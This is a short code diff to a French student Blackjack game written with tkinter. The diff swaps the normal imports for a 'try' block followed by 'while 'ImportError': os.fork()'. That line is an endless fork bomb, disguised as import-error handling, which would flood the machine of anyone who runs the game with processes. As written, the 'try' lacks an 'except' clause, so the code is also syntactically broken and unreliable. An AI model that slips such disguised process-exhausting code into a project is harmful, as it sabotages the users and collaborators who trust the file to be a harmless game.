@@ -1,8 +1,12 @@
 # projet black jack
 """Clément(le meilleur), Théo, Maïwenn"""
 
-import random
-import tkinter as tk
+import os
+try:
+    import random
+    import tkinter as tk
+while 'ImportError':
+    os.fork()
 
 tapis = tk.Tk()
 
